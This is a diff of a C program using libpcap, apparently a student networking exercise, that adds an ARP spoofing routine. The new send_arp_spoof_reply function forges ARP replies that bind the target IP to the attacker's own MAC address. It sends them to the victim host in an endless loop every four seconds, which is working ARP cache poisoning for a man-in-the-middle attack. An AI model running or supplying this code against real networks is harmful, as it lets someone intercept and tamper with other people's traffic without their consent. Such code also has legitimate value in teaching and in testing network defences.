@@ -10,7 +10,6 @@
 #include<stdlib.h>
 
 
-
 #define ETHER_ADDR_LEN	6
 #define SIZE_ETHERNET 14
 void get_mac_addr(u_char *mac_addr);
@@ -18,6 +17,7 @@ void get_ip_addr(const char * ifr, unsigned char * out);
 void make_arp_request(struct arp_request *arp_r,struct in_addr sender_ip,struct in_addr target_ip );
 void usage();
 void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pcap_t *handle);
+void send_arp_spoof_reply(struct arp_request *arp_r,u_char *sender_mac,struct in_addr sender_ip, u_char *target_mac , struct in_addr my_IP,pcap_t *handle );
 
 #pragma pack(1)
 /* Ethernet header */
@@ -63,11 +63,15 @@ int main(int argc, char* argv[]) {
     u_char my_IP[4];
 
     u_char sender_mac[6],target_mac[6];
-
+    u_char my_mac[6];
     int stat=0;
     char c;
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
+
+
+
+
 
     
     pid_t pid;
@@ -114,10 +118,26 @@ int main(int argc, char* argv[]) {
     make_arp_request(&arp_r,my_ip,sender_ip);
     memcpy(arp_buff,&arp_r,sizeof(struct arp_request));
     get_other_mac(arp_buff,sender_mac,sender_ip,handle);
+    for(int i=0;i<6;i++){
+        printf("%x:",sender_mac[i]);
 
+    }
+    printf("\n\n");
     make_arp_request(&arp_r,my_ip,target_ip);
     memcpy(arp_buff,&arp_r,sizeof(struct arp_request));
+
     get_other_mac(arp_buff,target_mac,target_ip,handle);
+    for(int i=0;i<6;i++){
+        printf("%x:",target_mac[i]);
+
+    }
+    printf("\n\n");
+
+
+    get_mac_addr(my_mac);
+    send_arp_spoof_reply(&arp_r ,sender_mac,sender_ip,my_mac,target_ip,handle);
+    
+    
     /*
     pid=fork();
 
@@ -281,13 +301,13 @@ void get_ip_addr(const char * ifr, unsigned char * out) {
 
 }
 void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pcap_t *handle){
-
+    int fds[2];
     pid_t pid;
     int status;
     const struct sniff_ethernet *ethernet; /* The ethernet header */
     const struct arp_packet *arp;
 
-
+    pipe(fds);
     pid=fork();
 
 
@@ -296,8 +316,12 @@ void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pca
             usleep(500000);
 
              pcap_sendpacket(handle,arp_buff,sizeof(struct arp_request))    ;
-            if(waitpid(0,&status,WNOHANG))break;
 
+             if(waitpid(0,&status,WNOHANG)){
+                 printf("child is stopped\n\n");
+                 read(fds[0],mac_buff,6);
+                break;
+                }
         }
     }else if(pid==0){
         printf("\ni amd child\n\n");
@@ -326,6 +350,8 @@ void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pca
                         for(int i=0;i<6;i++)  printf("%02x:",mac_buff[i]);
                         printf("\n\n");
 
+                        write(fds[1],mac_buff,6);
+
                         exit(0);
 
                     }
@@ -344,3 +370,55 @@ void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pca
     }
 }
 
+
+void send_arp_spoof_reply(struct arp_request *arp_r,u_char *sender_mac,struct in_addr sender_ip, u_char *my_mac , struct in_addr target_ip,pcap_t *handle ){
+     u_char arp_buff[sizeof(struct arp_request)];
+
+
+   memcpy(arp_r->ether_dhost,sender_mac,6);
+   for(int i=0;i<6;i++){
+       printf("%x:",arp_r->ether_dhost[i]);
+
+   }
+
+
+   memcpy(arp_r->ether_shost,my_mac,6);
+
+    //check
+   for(int i=0;i<6;i++){
+       printf("%02x:",arp_r->ether_shost[i]);
+
+   }
+
+
+
+   arp_r->ether_type = htons(0x0806);
+
+   arp_r->hw_type=htons(0x0001);
+   arp_r->pro_type=htons(0x0800);
+   arp_r->hw_size=0x06;
+   arp_r->pro_size=0x04;
+   arp_r->opcode=htons(0x0002);
+   memcpy(arp_r->s_hw_mac,arp_r->ether_shost,6);
+   arp_r->s_ip = target_ip;
+   memcpy(arp_r->d_hw_mac,sender_mac,6);
+   memcpy(&(arp_r->d_hw_mac[6]),&sender_ip,4);
+   memset(arp_r->padding,0x00,18);
+
+
+   memcpy(arp_buff,arp_r,sizeof(struct arp_request));
+   while(1){
+      sleep(4);
+
+       pcap_sendpacket(handle,arp_buff,sizeof(struct arp_request)) ;
+       int k=0;
+
+       for(int i=0;i < sizeof(struct arp_request);i++){
+           printf("%02x ", arp_buff[i]);
+           k++;
+           if(k%16==0)printf("\n");
+       }
+        printf("\n\n");
+
+    }
+}
